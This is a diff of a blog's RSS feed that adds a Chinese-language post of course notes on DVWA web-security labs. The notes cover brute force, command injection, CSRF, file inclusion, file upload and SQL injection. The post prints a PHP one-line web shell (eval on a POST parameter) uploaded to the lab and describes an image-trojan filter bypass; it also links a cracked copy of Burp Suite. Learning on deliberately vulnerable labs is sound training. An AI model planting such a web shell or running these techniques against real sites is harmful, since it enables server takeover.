@@ -1,4 +1,147 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>notes on nRevery's Blog</title><link>https://blog.nrevery.cn/tags/notes/</link><description>Recent content in notes on nRevery's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>nRevery</copyright><lastBuildDate>Thu, 18 Apr 2024 21:48:15 +0800</lastBuildDate><atom:link href="https://blog.nrevery.cn/tags/notes/index.xml" rel="self" type="application/rss+xml"/><item><title>Offensive Shellcode from Scratch</title><link>https://blog.nrevery.cn/p/offensive-shellcode-from-scratch/</link><pubDate>Thu, 18 Apr 2024 21:48:15 +0800</pubDate><guid>https://blog.nrevery.cn/p/offensive-shellcode-from-scratch/</guid><description/></item><item><title>An Intro to C for Windows</title><link>https://blog.nrevery.cn/p/an-intro-to-c-for-windows/</link><pubDate>Wed, 17 Apr 2024 22:58:23 +0800</pubDate><guid>https://blog.nrevery.cn/p/an-intro-to-c-for-windows/</guid><description>&lt;ol>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>notes on nRevery's Blog</title><link>https://blog.nrevery.cn/tags/notes/</link><description>Recent content in notes on nRevery's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>nRevery</copyright><lastBuildDate>Sun, 02 Jun 2024 19:20:28 +0800</lastBuildDate><atom:link href="https://blog.nrevery.cn/tags/notes/index.xml" rel="self" type="application/rss+xml"/><item><title>Web</title><link>https://blog.nrevery.cn/p/web/</link><pubDate>Sun, 02 Jun 2024 19:20:28 +0800</pubDate><guid>https://blog.nrevery.cn/p/web/</guid><description>&lt;h2 id="环境">环境&lt;/h2>
+&lt;h3 id="burp-suite">burp suite&lt;/h3>
+&lt;p>吾爱破解
+&lt;a class="link" href="https://www.52pojie.cn/thread-1544866-1-1.html" target="_blank" rel="noopener"
+>https://www.52pojie.cn/thread-1544866-1-1.html&lt;/a>&lt;/p>
+&lt;h3 id="容器">容器&lt;/h3>
+&lt;p>小皮、dvwa
+&lt;a class="link" href="https://blog.csdn.net/Stupid__Angel/article/details/127060860" target="_blank" rel="noopener"
+>https://blog.csdn.net/Stupid__Angel/article/details/127060860&lt;/a>
+&lt;a class="link" href="https://blog.csdn.net/m0_60884805/article/details/127086871" target="_blank" rel="noopener"
+>https://blog.csdn.net/m0_60884805/article/details/127086871&lt;/a>
+若小皮的mysql和本机mysql冲突，可用如下方法解决：
+&lt;a class="link" href="https://blog.csdn.net/weixin_46104490/article/details/121036597" target="_blank" rel="noopener"
+>https://blog.csdn.net/weixin_46104490/article/details/121036597&lt;/a>&lt;/p>
+&lt;h3 id="一些问题">一些问题&lt;/h3>
+&lt;p>（firefox上）&lt;/p>
+&lt;ol>
+&lt;li>burp抓不到包
+解决burp浏览器抓包提示有软件正在阻止 Firefox 安全地连接至此网站，PortSwigger CA 造成……的问题
+&lt;a class="link" href="https://blog.csdn.net/htsssss/article/details/128469844" target="_blank" rel="noopener"
+>https://blog.csdn.net/htsssss/article/details/128469844&lt;/a>&lt;/li>
+&lt;li>抓不到本地的包，其他正常
+&lt;a class="link" href="https://blog.csdn.net/songling515010475/article/details/107269583" target="_blank" rel="noopener"
+>https://blog.csdn.net/songling515010475/article/details/107269583&lt;/a>&lt;/li>
+&lt;/ol>
+&lt;h2 id="学习记录">学习记录&lt;/h2>
+&lt;h3 id="暴力破解">暴力破解&lt;/h3>
+&lt;p>http://ip/DVWA-master/setup.php
+ip可以写127.0.0.1，如果抓包不成功改成本机ip
+DVWA Security改成low，Brute Force里登录
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602192914.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>对于“length”长度不同的，表示该页面存在SQL注入漏洞，或者是找到的正确参数。
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602200116.png"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="命令注入">命令注入&lt;/h3>
+&lt;p>正常
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602200944.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>利用PHP的特性注入
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602200904.png"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="跨站请求伪造">跨站请求伪造&lt;/h3>
+&lt;p>XSS在客户端执行脚本，CSRF则是在WEB应用中执行操作
+利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230441.png"
+loading="lazy"
+>
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230516.png"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="文件包含">文件包含&lt;/h3>
+&lt;p>本地文件包含漏洞：通过动态变量的方式引入需要包含的文件时，用户对这个变量可控，服务端又没有做合理的校验，或者校验被绕过
+例如：http://xxx/xxx/xxx/?page=test.php
+下图可以看到绝对路径暴露
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602202932.png"
+loading="lazy"
+>
+远程文件包含漏洞。
+例如：http://xxx/xxx/xxx/?page=http://aaa/bbb/ccc/test.php
+假设可以访问服务器192.168.192.1，则可以成功执行test.txt&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://www.dvwa-test.com/vulnerabilities/fi/?page=http://192.168.192.1/test.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过URL编码增加隐蔽性
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602204637.png"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="文件上传">文件上传&lt;/h3>
+&lt;p>下载中国蚁剑
+&lt;a class="link" href="https://github.com/AntSwordProject/" target="_blank" rel="noopener"
+>https://github.com/AntSwordProject/&lt;/a>
+下载本体和加载器，下载zip有安全提示，改成git clone的方式即可
+注意关闭蚁剑并没有终止进程，需手工结束任务
+上传test.php,内容如下：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">phpinfo&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602212716.png"
+loading="lazy"
+>
+可如下运行：
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602213325.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>一句话木马以hack.php上传：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="o">@&lt;/span>&lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;pass&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220022.png"
+loading="lazy"
+>
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220135.png"
+loading="lazy"
+>
+安全设置为medium，看到文件类型受到限制
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220333.png"
+loading="lazy"
+>
+test.png仅修改扩展名就可以上传成功，且正常访问
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602220927.png"
+loading="lazy"
+>
+hack.png也能上传成功但不能访问
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602221330.png"
+loading="lazy"
+>
+抓包
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602225450.png"
+loading="lazy"
+>
+图片木马
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230116.png"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="sql注入">SQL注入&lt;/h3>
+&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/5bc123563dca8005e859acde7809710.png"
+loading="lazy"
+>
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/3e3eb441f4b84ffbe9a5d67fdbd3ffe.png"
+loading="lazy"
+>
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230933.png"
+loading="lazy"
+>
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602231024.png"
+loading="lazy"
+>
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602231114.png"
+loading="lazy"
+>
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602232614.png"
+loading="lazy"
+>
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20240602230957.png"
+loading="lazy"
+>&lt;/p>
+&lt;h2 id="学习体会">学习体会&lt;/h2>
+&lt;p>环境搭建的挑战：环境搭建细节很多，当然网上的资料也非常丰富。在搭建DVWA和其他测试环境的过程中，我遇到了许多问题，如MySQL冲突、无法抓包等。这些问题的解决过程让我学会了如何排查和解决环境配置中的各种问题，提高了我的解决问题的能力。
+工具的使用：通过使用Burp Suite等工具，我对Web安全有了初步了解。各种工具的强大功能让我能够方便地进行抓包、修改请求、重放请求、进行各类实践。课程分为多个维度，让我从不同方面对Web安全进行学习。例如，使用Burp Suite进行抓包时，我了解到了HTTP请求和响应的详细结构，并能够模拟和修改这些请求，从而进行更深入的测试。
+漏洞理解与利用：通过对各种漏洞的理解与利用，如SQL注入、文件包含、CSRF等，我深刻认识到了这些漏洞的危害性和防御的重要性。通过实际操作，我学会了如何发现和利用这些漏洞，同时也了解了相应的防御措施。例如，通过SQL注入实验，我了解到在输入参数时必须严格过滤和校验，以防止恶意代码的注入和执行。
+安全意识的提升：此外，我的安全意识得到了很大的提升。安全问题重要又隐蔽，从开发到运维，从用户操作到系统配置，每一个环节都可能存在安全隐患，需要我们时刻保持警惕。通过学习，我了解到安全不仅仅是技术问题，更是一个需要全方位考虑的问题。在编写代码时，我会更加注重输入验证和输出编码，以防止常见的安全漏洞。
+这些知识还有一部分没有完全掌握，我会课后继续学习。
+建议：希望能多提供配套的视频教程和在线资源，可以随时观看和复习。&lt;/p></description></item><item><title>Offensive Shellcode from Scratch</title><link>https://blog.nrevery.cn/p/offensive-shellcode-from-scratch/</link><pubDate>Thu, 18 Apr 2024 21:48:15 +0800</pubDate><guid>https://blog.nrevery.cn/p/offensive-shellcode-from-scratch/</guid><description/></item><item><title>An Intro to C for Windows</title><link>https://blog.nrevery.cn/p/an-intro-to-c-for-windows/</link><pubDate>Wed, 17 Apr 2024 22:58:23 +0800</pubDate><guid>https://blog.nrevery.cn/p/an-intro-to-c-for-windows/</guid><description>&lt;ol>
 &lt;li>int __cdecl&lt;/li>
 &lt;/ol>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__cdecl&lt;/span> &lt;span class="nf">myFunction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">);&lt;/span>
